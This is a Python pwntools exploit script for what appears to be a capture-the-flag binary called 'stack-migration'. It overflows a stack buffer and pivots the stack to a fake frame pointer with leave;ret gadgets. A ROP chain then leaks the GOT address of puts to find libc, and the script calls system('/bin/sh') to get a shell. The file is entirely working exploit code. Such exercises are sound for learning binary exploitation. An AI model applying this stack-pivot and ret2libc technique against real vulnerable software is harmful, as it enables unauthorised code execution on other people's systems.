#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./stack-migration')
elf = ELF('./stack-migration')
libc = ELF('./libc-2.27.so')

def pr(a,addr):
	log.success(a+': '+hex(addr))

fake_rbp = 0x601900
main_puts_read = 0x40053F
leave_ret = 0x400562
prdi_ret = 0x4005d3
puts_plt = 0x400430
puts_got = 0x600fe0

p.recvuntil("Please pwn me :)\n")
payload1 = 'A'*0x30 + p64(fake_rbp) + p64(main_puts_read)
p.send(payload1)

#main_puts_read
p.recvuntil("Please pwn me :)\n")
payload2  = p64(fake_rbp-0x30) + p64(prdi_ret) + p64(puts_got) + p64(puts_plt)
payload2 += p64(main_puts_read) + p64(0) + p64(fake_rbp-0x30) + p64(leave_ret)
p.send(payload2)

puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
libcbase = puts_addr - libc.sym['puts']
system = libcbase + libc.sym['system']
bin_sh = libcbase + libc.search('/bin/sh').next()
pr('libcbase',libcbase)

p.recvuntil("Please pwn me :)\n")
payload3  = p64(prdi_ret) + p64(bin_sh) + p64(system) + p64(0)*3
payload3 += p64(fake_rbp-0x68) + p64(leave_ret)
p.send(payload3)

p.interactive()